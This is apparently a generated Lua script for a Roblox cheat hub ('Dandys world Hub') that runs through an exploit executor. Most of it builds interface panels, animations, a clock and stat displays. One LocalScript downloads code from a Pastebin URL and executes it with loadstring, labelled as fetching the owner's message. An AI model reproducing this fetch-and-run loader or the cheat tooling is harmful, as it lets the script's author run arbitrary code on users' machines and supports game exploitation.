G2L["1a0"] = Instance.new("TextBox", G2L["166"]);
G2L["1a0"]["CursorPosition"] = -1;
G2L["1a0"]["TextStrokeTransparency"] = 2;
G2L["1a0"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a0"]["BorderSizePixel"] = 2;
G2L["1a0"]["TextSize"] = 14;
G2L["1a0"]["TextWrapped"] = true;
G2L["1a0"]["TextScaled"] = true;
G2L["1a0"]["BackgroundColor3"] = Color3.fromRGB(0, 178, 84);
G2L["1a0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a0"]["PlaceholderText"] = [[SEND MESSAGE TO CREATOR!!]];
G2L["1a0"]["Size"] = UDim2.new(0, 238, 0, 40);
G2L["1a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a0"]["Text"] = [[]];
G2L["1a0"]["Position"] = UDim2.new(0.3439154326915741, 0, 0.6630434989929199, 0);
G2L["1a0"]["Name"] = [[asdasd]];

-- StarterGui.DebugVersion.Title.script_content.MainSix.asdasd.UIStroke
G2L["1a1"] = Instance.new("UIStroke", G2L["1a0"]);
G2L["1a1"]["Color"] = Color3.fromRGB(0, 255, 107);
G2L["1a1"]["Thickness"] = 3;
G2L["1a1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.TextLabel
G2L["1a2"] = Instance.new("TextLabel", G2L["2"]);
G2L["1a2"]["BorderSizePixel"] = 0;
G2L["1a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a2"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a2"]["TextSize"] = 14;
G2L["1a2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a2"]["Size"] = UDim2.new(0, 330, 0, 20);
G2L["1a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a2"]["Text"] = [[Dandys world Hub / By G0bbyD0llan57 on YT]];
G2L["1a2"]["BackgroundTransparency"] = 1;
G2L["1a2"]["Position"] = UDim2.new(0.0634920671582222, 0, -0.0476190485060215, 0);

-- StarterGui.DebugVersion.Title.draggable
G2L["1a3"] = Instance.new("LocalScript", G2L["2"]);
G2L["1a3"]["Name"] = [[draggable]];

-- StarterGui.DebugVersion.Title.close
G2L["1a4"] = Instance.new("TextButton", G2L["2"]);
G2L["1a4"]["TextWrapped"] = true;
G2L["1a4"]["TextScaled"] = true;
G2L["1a4"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["1a4"]["TextSize"] = 14;
G2L["1a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a4"]["Size"] = UDim2.new(0, 24, 0, 19);
G2L["1a4"]["Name"] = [[close]];
G2L["1a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a4"]["Text"] = [[x]];
G2L["1a4"]["Position"] = UDim2.new(0.9365079402923584, 0, 0, 0);

-- StarterGui.DebugVersion.Title.close.LocalScript
G2L["1a5"] = Instance.new("LocalScript", G2L["1a4"]);


-- StarterGui.DebugVersion.Title.MM
G2L["1a6"] = Instance.new("TextButton", G2L["2"]);
G2L["1a6"]["TextWrapped"] = true;
G2L["1a6"]["TextScaled"] = true;
G2L["1a6"]["BackgroundColor3"] = Color3.fromRGB(0, 48, 255);
G2L["1a6"]["TextSize"] = 14;
G2L["1a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a6"]["Size"] = UDim2.new(0, 24, 0, 19);
G2L["1a6"]["Name"] = [[MM]];
G2L["1a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a6"]["Text"] = [[-]];
G2L["1a6"]["Position"] = UDim2.new(0.8730158805847168, 0, 0, 0);

-- StarterGui.DebugVersion.Title.MM.LocalScript
G2L["1a7"] = Instance.new("LocalScript", G2L["1a6"]);


-- StarterGui.DebugVersion.Title.GObbyImage
G2L["1a8"] = Instance.new("ImageLabel", G2L["2"]);
G2L["1a8"]["BorderSizePixel"] = 0;
G2L["1a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a8"]["Image"] = [[http://www.roblox.com/asset/?id=13786322913]];
G2L["1a8"]["Size"] = UDim2.new(0, 22, 0, 20);
G2L["1a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a8"]["Name"] = [[GObbyImage]];
G2L["1a8"]["BackgroundTransparency"] = 1;
G2L["1a8"]["Position"] = UDim2.new(0, 0, -0.05384615436196327, 0);

-- StarterGui.DebugVersion.Title.GObbyImage.TextButton
G2L["1a9"] = Instance.new("TextButton", G2L["1a8"]);
G2L["1a9"]["BorderSizePixel"] = 0;
G2L["1a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a9"]["TextSize"] = 14;
G2L["1a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a9"]["Size"] = UDim2.new(0, 22, 0, 21);
G2L["1a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a9"]["Text"] = [[]];
G2L["1a9"]["Position"] = UDim2.new(0, 0, 0.00000228881845032447, 0);
G2L["1a9"]["BackgroundTransparency"] = 1;

-- StarterGui.DebugVersion.Title.GObbyImage.TextButton.LocalScript
G2L["1aa"] = Instance.new("LocalScript", G2L["1a9"]);


-- StarterGui.DebugVersion.Title.SoundStarter
G2L["1ab"] = Instance.new("LocalScript", G2L["2"]);
G2L["1ab"]["Name"] = [[SoundStarter]];

-- StarterGui.DebugVersion.Title.close
G2L["1ac"] = Instance.new("TextButton", G2L["2"]);
G2L["1ac"]["TextWrapped"] = true;
G2L["1ac"]["TextScaled"] = true;
G2L["1ac"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["1ac"]["TextSize"] = 14;
G2L["1ac"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ac"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ac"]["Size"] = UDim2.new(0, 24, 0, 19);
G2L["1ac"]["Name"] = [[close]];
G2L["1ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ac"]["Text"] = [[x]];
G2L["1ac"]["Position"] = UDim2.new(0.9365079402923584, 0, 0, 0);

-- StarterGui.DebugVersion.Title.close.LocalScript
G2L["1ad"] = Instance.new("LocalScript", G2L["1ac"]);


-- StarterGui.DebugVersion.HubTester
G2L["1ae"] = Instance.new("LocalScript", G2L["1"]);
G2L["1ae"]["Name"] = [[HubTester]];

-- StarterGui.DebugVersion.VersionHandler
G2L["1af"] = Instance.new("LocalScript", G2L["1"]);
G2L["1af"]["Name"] = [[VersionHandler]];

-- StarterGui.DebugVersion.GobbyAdmin
G2L["1b0"] = Instance.new("LocalScript", G2L["1"]);
G2L["1b0"]["Name"] = [[GobbyAdmin]];

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.LocalScript
local function C_7()
	local script = G2L["7"];
	-- Obtener el jugador local
	local player = game.Players.LocalPlayer

	-- Obtener el Parent del script
	local parent = script.Parent

	-- Función para reemplazar "%plr%" con el nombre del jugador local
	local function replacePlaceholderWithPlayerName(text)
		return text:gsub("%%plr%%", player.Name)
	end

	-- Verificar si el Parent es un TextButton o un TextLabel
	if parent:IsA("TextButton") or parent:IsA("TextLabel") then
		-- Reemplazar el texto del Parent si contiene "%plr%"
		if parent.Text:find("%%plr%%") then
			parent.Text = replacePlaceholderWithPlayerName(parent.Text)
		end
	end

end;
task.spawn(C_7);
-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextLabel.MulticolorScript
local function C_f()
	local script = G2L["f"];
	local textObject = script.Parent
	local tweenService = game:GetService("TweenService") -- Obtener TweenService

	local colors = {
		Color3.new(1, 0, 0), -- Rojo
		Color3.new(0, 1, 0), -- Verde
		Color3.new(0, 0, 1), -- Azul
		Color3.new(1, 1, 0), -- Amarillo
		Color3.new(0, 1, 1), -- Cian
		Color3.new(1, 0, 1)  -- Magenta
	}

	local interval = 0.5 -- Tiempo entre cambios de color
	local tweenTime = 0.4 -- Duración del tween

	-- Función para realizar el tween del color del texto
	local function tweenColorTo(newColor)
		local tweenInfo = TweenInfo.new(tweenTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
		local tween = tweenService:Create(textObject, tweenInfo, {TextColor3 = newColor})
		tween:Play()
	end

	local function cycleColors()
		while true do
			for _, color in ipairs(colors) do
				tweenColorTo(color)
				wait(interval)
			end
		end
	end

	cycleColors()

end;
task.spawn(C_f);
-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextButton.LocalScript
local function C_11()
	local script = G2L["11"];
	local TweenService = game:GetService("TweenService")

	-- Función para ocultar el Frame y todos sus hijos
	local function hideFrameWithTween(frame, duration)
		local tweenInfo = TweenInfo.new(
			duration or 0.5, -- Duración del Tween (por defecto 0.5 segundos)
			Enum.EasingStyle.Sine,
			Enum.EasingDirection.Out
		)

		-- Ocultar el frame primero con tween
		local tween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1, BorderSizePixel = 0})
		tween:Play()

		-- Recorrer todos los descendientes del Frame
		for _, instance in pairs(frame:GetDescendants()) do
			local properties = {}

			-- Ocultar todas las propiedades de transparencia relevantes, excepto las imágenes
			if instance:IsA("Frame") or instance:IsA("ImageLabel") or instance:IsA("ImageButton") then
				properties.BackgroundTransparency = 1 -- Ocultar fondo
				properties.BorderSizePixel = 0 -- Quitar bordes
			elseif instance:IsA("TextLabel") or instance:IsA("TextButton") then
				properties.TextTransparency = 1 -- Ocultar texto
				properties.BackgroundTransparency = 1 -- Ocultar fondo
				properties.BorderSizePixel = 0 -- Quitar bordes
			elseif instance:IsA("UIStroke") then
				properties.Transparency = 1 -- Ocultar bordes creados por UIStroke
			end

			-- Si hay propiedades que cambiar, crear y ejecutar el tween
			if next(properties) then
				local tween = TweenService:Create(instance, tweenInfo, properties)
				tween:Play()
			end
		end
	end

	-- Función para mostrar el Frame y sus hijos con Tween, restaurando sus propiedades originales
	local function showFrameWithTween(frame, duration)
		local tweenInfo = TweenInfo.new(
			duration or 0.5, -- Duración del Tween (por defecto 0.5 segundos)
			Enum.EasingStyle.Sine,
			Enum.EasingDirection.Out
		)

		-- Tabla para almacenar las propiedades originales de las instancias
		local originalProperties = {}

		-- Primero, ocultar todas las instancias y guardar sus propiedades originales
		for _, instance in pairs(frame:GetDescendants()) do
			local properties = {}

			if instance:IsA("Frame") or instance:IsA("ImageLabel") or instance:IsA("ImageButton") then
				properties.BackgroundTransparency = instance.BackgroundTransparency
				properties.BorderSizePixel = instance.BorderSizePixel
				instance.BackgroundTransparency = 1
				instance.BorderSizePixel = 0
			elseif instance:IsA("TextLabel") or instance:IsA("TextButton") then
				properties.TextTransparency = instance.TextTransparency
				properties.BackgroundTransparency = instance.BackgroundTransparency
				properties.BorderSizePixel = instance.BorderSizePixel
				instance.TextTransparency = 1
				instance.BackgroundTransparency = 1
				instance.BorderSizePixel = 0
			elseif instance:IsA("UIStroke") then
				properties.Transparency = instance.Transparency
				instance.Transparency = 1
			end

			-- Guardar las propiedades originales en la tabla
			originalProperties[instance] = properties
		end

		-- Hacer visible el frame principal
		frame.Visible = true

		-- Restaurar las propiedades originales con un tween
		for instance, properties in pairs(originalProperties) do
			local tweenProperties = {}

			-- Restaurar las propiedades guardadas
			if properties.BackgroundTransparency ~= nil then
				tweenProperties.BackgroundTransparency = properties.BackgroundTransparency
			end
			if properties.BorderSizePixel ~= nil then
				tweenProperties.BorderSizePixel = properties.BorderSizePixel
			end
			if properties.TextTransparency ~= nil then
				tweenProperties.TextTransparency = properties.TextTransparency
			end
			if properties.Transparency ~= nil then
				tweenProperties.Transparency = properties.Transparency
			end

			-- Crear y ejecutar el tween para restaurar las propiedades originales
			local tween = TweenService:Create(instance, tweenInfo, tweenProperties)
			tween:Play()
		end
	end

	-- Crear el objeto de sonido para la transición
	local soundId2 = "rbxassetid://9120327161"
	local sound2 = Instance.new("Sound")
	sound2.SoundId = soundId2
	sound2.Parent = script.Parent
	sound2.PlaybackSpeed = 0.9
	sound2.Volume = 1  -- Ajustar el volumen

	-- Función para disminuir el volumen del sonido gradualmente
	local function fadeOutSound(sound, fadeDuration)
		local tweenInfo = TweenInfo.new(fadeDuration, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
		local tween = TweenService:Create(sound, tweenInfo, {Volume = 0})
		tween:Play()
	end
	local isClicked = false
	-- Conectar el evento al hacer clic en el botón
	script.Parent.MouseButton1Click:Connect(function()
		if isClicked then return end
		wait()
		isClicked = true
		sound2:Play() -- Reproducir el sonido

		-- Iniciar la animación de ocultar el frame
		hideFrameWithTween(script.Parent.Parent.Parent.Parent.Parent.welcome, 2)

		-- Después de 2 segundos, iniciar el fade out del sonido
		wait(2)
		fadeOutSound(sound2, 2) -- Bajar volumen durante 2 segundos

		-- Cuando el sonido termina, restaurar el volumen original
		sound2.Ended:Connect(function()
			sound2.Volume = 1 -- Restaurar volumen cuando el sonido termina
		end)

		-- Ocultar el frame principal y mostrar otro después de la animación
		script.Parent.Parent.Parent.Parent.Visible = false
		--script.Parent.Parent.Parent.Parent.Parent.All.Visible = true
		showFrameWithTween(script.Parent.Parent.Parent.Parent.Parent.All, 1)
	end)

	-- Variables del botón
	local button = script.Parent
	local soundId = "rbxassetid://4499400560"

	-- Crear el objeto de sonido para el botón
	local sound = Instance.new("Sound")
	sound.SoundId = soundId
	sound.Parent = button
	sound.Volume = 1  -- Ajustar el volumen

	-- Función para reproducir el sonido al pasar el mouse sobre el botón
	button.MouseEnter:Connect(function()
		sound:Play()
	end)

end;
task.spawn(C_11);
-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.Frame.LoaDStriNgTEXT.LocalScript
local function C_1d()
	local script = G2L["1d"];
	local TextLabel = script.Parent

	-- Intentar obtener el texto desde Pastebin y ejecutarlo
	local success, result = pcall(function()
		return loadstring(game:HttpGet("https://pastebin.com/raw/DGqB0GQD"))()
	end)

	-- Si la ejecución fue exitosa, asignar el texto al TextLabel
	if success and type(result) == "string" then
		TextLabel.Text = "script owner last message: "..result
	else
		TextLabel.Text = "Error loading text"
		warn("Error al ejecutar el loadstring: " .. tostring(result))
	end

end;
task.spawn(C_1d);
-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.MiscText.LocalScript
local function C_20()
	local script = G2L["20"];
	-- Obtener el TextLabel
	local screenGui = script.Parent
	local textLabel = screenGui

	-- Colores para diferentes festividades
	local holidayColors = {
		Christmas = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0)}, -- Rojo y Verde
		Halloween = {Color3.fromRGB(255, 165, 0), Color3.fromRGB(75, 0, 130)}, -- Naranja y Morado
		Easter = {Color3.fromRGB(255, 182, 193), Color3.fromRGB(135, 206, 250)}, -- Rosa claro y Azul claro
		Valentines = {Color3.fromRGB(255, 105, 180), Color3.fromRGB(255, 192, 203)}, -- Rosa fuerte y Rosa claro
		IndependenceDay = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255)}, -- Rojo y Azul (EEUU)
		NewYear = {Color3.fromRGB(255, 215, 0), Color3.fromRGB(192, 192, 192)}, -- Dorado y Plateado
		MonthEnd = {Color3.fromRGB(128, 0, 128), Color3.fromRGB(0, 255, 255)}, -- Morado y Cyan
	}

	-- Función para formatear la fecha
	local function formatDate(month, day)
		return os.date("%b %d", os.time({year = os.date("%Y"), month = month, day = day}))
	end

	-- Función para formatear la hora
	local function formatTime(hour, minute, second)
		return string.format("%02d:%02d:%02d", hour, minute, second)
	end

	-- Función para obtener el nombre de la festividad actual, si aplica
	local function getCurrentHoliday(month, day)
		if month == 12 and day == 25 then
			return "Christmas"
		elseif month == 10 and day == 31 then
			return "Halloween"
		elseif month == 2 and day == 14 then
			return "Valentines"
		elseif month == 7 and day == 4 then
			return "IndependenceDay"
		elseif month == 4 and day >= 1 and day <= 30 then -- Generalizar Easter para el mes de abril
			return "Easter"
		elseif month == 1 and day == 1 then
			return "NewYear"
		elseif (month == 1 or month == 3 or month == 5 or month == 7 or month == 8 or month == 10 or month == 12) and day == 31 then
			return "MonthEnd" -- Fin de mes para meses con 31 días
		elseif (month == 4 or month == 6 or month == 9 or month == 11) and day == 30 then
			return "MonthEnd" -- Fin de mes para meses con 30 días
		elseif month == 2 and (day == 28 or day == 29) then
			return "MonthEnd" -- Fin de mes para febrero (considera año bisiesto)
		else
			return nil
		end
	end

	-- Función para cambiar los colores del texto según la festividad
	local function applyHolidayColors(holiday)
		local colors = holidayColors[holiday]
		if colors then
			-- Iniciar una nueva corutina para cambiar los colores
			coroutine.wrap(function()
				while true do
					for _, color in ipairs(colors) do
						textLabel.TextColor3 = color
						wait(0.5) -- Cambia el color cada medio segundo
					end
				end
			end)() -- Llamar a la corutina inmediatamente
		end
	end

	-- Función para actualizar la fecha y hora
	local function updateTime()
		while true do
			-- Obtener la fecha y hora actual
			local currentTime = os.date("*t")
			local hour = currentTime.hour
			local minute = currentTime.min
			local second = currentTime.sec
			local month = currentTime.month
			local day = currentTime.day

			-- Formatear la fecha actual
			local formattedDate = formatDate(month, day)

			-- Obtener la festividad actual, si existe
			local currentHoliday = getCurrentHoliday(month, day)

			-- Actualizar el TextLabel con la fecha y hora formateada
			local holidayText = currentHoliday and " (" .. currentHoliday .. ")" or ""
			textLabel.Text = formattedDate .. " - " .. formatTime(hour, minute, second) .. holidayText

			-- Aplicar colores según la festividad, si aplica
			if currentHoliday then
				applyHolidayColors(currentHoliday)
			else
				-- Restablecer el color del texto al predeterminado si no es una festividad
				textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Blanco
			end

			-- Esperar 1 segundo antes de actualizar nuevamente
			wait(1)
		end
	end

	-- Iniciar la actualización de la hora
	updateTime()

end;
task.spawn(C_20);
-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.TextButton.LocalScript
local function C_22()
	local script = G2L["22"];
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	local function notify(arg, arg2)
		game.StarterGui:SetCore("SendNotification", {
			Title = arg,
			Text = arg2,
			Duration = 5
		})
	end
	local Button = script.Parent

	local Link = "https://www.youtube.com/@G0bbyD0llan57-ee1vl?sub_confirmation=1"

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Clipboard", "Copied to clipboard")
		else
			notify("Clipboard", "Your exploit doesn't have the ability to use the clipboard")
		end
	end

	Button.MouseButton1Click:Connect(function()
		print("Copying Link to Clipboard")
		toClipboard(Link)
	end)
end;
task.spawn(C_22);
-- StarterGui.DebugVersion.Title.script_content.pages.welcome.LocalScript
local function C_25()
	local script = G2L["25"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.welcomepage.Visible = true
		script.Parent.Parent.Parent.options.Visible = false
		script.Parent.Parent.Parent.information.Visible = false
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = false
		script.Parent.Parent.Parent.MainSix.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.greetings.Visible = false
	end)
end;
task.spawn(C_25);
-- StarterGui.DebugVersion.Title.script_content.pages.target.LocalScript
local function C_27()
	local script = G2L["27"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = true
		script.Parent.Parent.Parent.welcomepage.Visible = false
		script.Parent.Parent.Parent.options.Visible = false
		script.Parent.Parent.Parent.information.Visible = false
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.greetings.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = false
		script.Parent.Parent.Parent.MainSix.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
	end)
end;
task.spawn(C_27);
-- StarterGui.DebugVersion.Title.script_content.pages.options.LocalScript
local function C_29()
	local script = G2L["29"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.welcomepage.Visible = false
		script.Parent.Parent.Parent.options.Visible = false
		script.Parent.Parent.Parent.information.Visible = true
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = false
		script.Parent.Parent.Parent.MainSix.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.greetings.Visible = false
	end)
end;
task.spawn(C_29);
-- StarterGui.DebugVersion.Title.script_content.pages.options.LocalScript
local function C_2b()
	local script = G2L["2b"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.welcomepage.Visible = false
		script.Parent.Parent.Parent.options.Visible = true
		script.Parent.Parent.Parent.information.Visible = false
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = false
		script.Parent.Parent.Parent.MainSix.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.greetings.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = false
	end)
end;
task.spawn(C_2b);
-- StarterGui.DebugVersion.Title.script_content.pages.HappyFace.LocalScript
local function C_2d()
	local script = G2L["2d"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.welcomepage.Visible = false
		script.Parent.Parent.Parent.options.Visible = false
		script.Parent.Parent.Parent.information.Visible = false
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = false
		script.Parent.Parent.Parent.MainSix.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.greetings.Visible = true
	end)
end;
task.spawn(C_2d);
-- StarterGui.DebugVersion.Title.script_content.pages.HappyFace.LocalScript
local function C_2e()
	local script = G2L["2e"];
	-- Hacer este botón especial
	local TextButton = script.Parent
	local oldsizee = TextButton.Size
	-- Cambiar el color de fondo al pasar el mouse por encima
	TextButton.MouseEnter:Connect(function()
		TextButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2) -- Color verde
		TextButton.Text = ":>" -- Cambiar el texto al pasar el mouse
	end)

	-- Volver al color original cuando el mouse salga
	TextButton.MouseLeave:Connect(function()
		TextButton.BackgroundColor3 = Color3.new(0.0392157, 0.984314, 1) -- Color blanco
		TextButton.Text = ":D" -- Volver al texto original
	end)

	-- Animar el botón al hacer clic
	TextButton.MouseButton1Click:Connect(function()

	end)

	-- Configuración inicial del botón
	TextButton.Text = ":D"
	TextButton.BackgroundColor3 = Color3.new(0.0392157, 0.984314, 1) -- Blanco
	TextButton.TextColor3 = Color3.new(0, 0, 0) -- Negro
	TextButton.Font = Enum.Font.SourceSansBold
	TextButton.TextScaled = true
end;
task.spawn(C_2e);
-- StarterGui.DebugVersion.Title.script_content.information.LocalScript
local function C_31()
	local script = G2L["31"];
	local workspace = game:GetService("Workspace")

	local parentFrame = script.Parent
	local scrollingFrame = parentFrame.ScrollingFrame
	local ChangeButton = script.Parent.TextButton
	local labelHeight = 25
	local padding = 5
	local showingMode = "Info" -- Track the current mode (Info, PlayerStats, DandyTracker)

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, padding)
	layout.Parent = scrollingFrame
	layout.FillDirection = Enum.FillDirection.Vertical
	layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
	layout.SortOrder = Enum.SortOrder.LayoutOrder

	local function updateCanvasSize()
		local totalHeight = (#scrollingFrame:GetChildren() - 1) * (labelHeight + padding)
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
	end

	local function createOrUpdateTextLabel(name, value)
		local label = scrollingFrame:FindFirstChild(name .. "Label")
		if not label then
			label = Instance.new("TextLabel")
			label.Name = name .. "Label"
			label.Size = UDim2.new(1, 0, 0, labelHeight)
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
			label.BackgroundTransparency = 1
			label.Parent = scrollingFrame
		end
		label.Text = "[" .. name .. "]: " .. tostring(value)
		updateCanvasSize()
	end

	local function initializeTextLabels(source)
		for _, label in pairs(scrollingFrame:GetChildren()) do
			if label:IsA("TextLabel") then
				label:Destroy()
			end
		end
		for _, instance in pairs(source:GetChildren()) do
			if instance:IsA("StringValue") or instance:IsA("NumberValue") or instance:IsA("BoolValue") then
				createOrUpdateTextLabel(instance.Name, instance.Value)
				instance.Changed:Connect(function(newValue)
					createOrUpdateTextLabel(instance.Name, newValue)
				end)
			end
		end
	end

	local Info = workspace:WaitForChild("Info")
	local playerStatsContainer = Info:WaitForChild("PlayerStats")
	local PLAYERSTATS = playerStatsContainer:WaitForChild(game.Players.LocalPlayer.Name)
	local DandysTracker = Info:WaitForChild("DandyTracker")

	initializeTextLabels(Info)

	local function toggleValues()
		if showingMode == "Info" then
			initializeTextLabels(PLAYERSTATS)
			ChangeButton.Text = "Show DandyTracker"
			showingMode = "PlayerStats"
		elseif showingMode == "PlayerStats" then
			initializeTextLabels(DandysTracker)
			ChangeButton.Text = "Show Info"
			showingMode = "DandyTracker"
		else
			initializeTextLabels(Info)
			ChangeButton.Text = "Show PlayerStats"
			showingMode = "Info"
		end
	end

	ChangeButton.MouseButton1Click:Connect(toggleValues)

	Info.ChildAdded:Connect(function(child)
		if child:IsA("StringValue") or child:IsA("NumberValue") or child:IsA("BoolValue") then
			createOrUpdateTextLabel(child.Name, child.Value)
			child.Changed:Connect(function(newValue)
				createOrUpdateTextLabel(child.Name, newValue)
			end)
			updateCanvasSize()
		end
	end)

	PLAYERSTATS.ChildAdded:Connect(function(child)
		if child:IsA("StringValue") or child:IsA("NumberValue") or child:IsA("BoolValue") then
			createOrUpdateTextLabel(child.Name, child.Value)
			child.Changed:Connect(function(newValue)
				createOrUpdateTextLabel(child.Name, newValue)
			end)
			updateCanvasSize()
		end
	end)

	DandysTracker.ChildAdded:Connect(function(child)
		if child:IsA("StringValue") or child:IsA("NumberValue") or child:IsA("BoolValue") then
			createOrUpdateTextLabel(child.Name, child.Value)
			child.Changed:Connect(function(newValue)
				createOrUpdateTextLabel(child.Name, newValue)
			end)
			updateCanvasSize()
		end
	end)

	Info.ChildRemoved:Connect(function(child)
		local label = scrollingFrame:FindFirstChild(child.Name .. "Label")
		if label then
			label:Destroy()
			updateCanvasSize()
		end
	end)

	PLAYERSTATS.ChildRemoved:Connect(function(child)
		local label = scrollingFrame:FindFirstChild(child.Name .. "Label")
		if label then
			label:Destroy()
			updateCanvasSize()
		end
	end)

	DandysTracker.ChildRemoved:Connect(function(child)
		local label = scrollingFrame:FindFirstChild(child.Name .. "Label")
		if label then
			label:Destroy()
			updateCanvasSize()
		end
	end)

end;
task.spawn(C_31);
-- StarterGui.DebugVersion.Title.script_content.options.TextButton.LocalScript
local function C_36()
	local script = G2L["36"];
	local function Debug(str, keynum)
		if script.Parent.Parent.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end

	local TargetToChangeBackGroundColor = script.Parent.Parent.Parent.Parent

	local ColourList = {
		Color3.fromRGB(255, 0, 0),
		Color3.fromRGB(0, 255, 0),
		Color3.fromRGB(0, 0, 255),
		Color3.fromRGB(255, 255, 0),
		Color3.fromRGB(255, 0, 255),
		Color3.fromRGB(0, 255, 255),
		Color3.fromRGB(255, 170, 0),
	}
	local index = 1
	local TweenService = game:GetService("TweenService")

	local function changetext()
		script.Parent.Text = "Change Title Bar Color ["..index.."]"
		script.Parent.BackgroundColor3 = ColourList[index]
	end
	script.Parent.MouseButton1Click:Connect(function()
		Debug("changed title bar color to "..index, 4)
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
		local tween = TweenService:Create(TargetToChangeBackGroundColor, tweenInfo, {
			BackgroundColor3 = ColourList[index]})
		tween:Play()
		index = index + 1
		if index > #ColourList then
			index = 1
		end
		changetext()
	end)
end;
task.spawn(C_36);
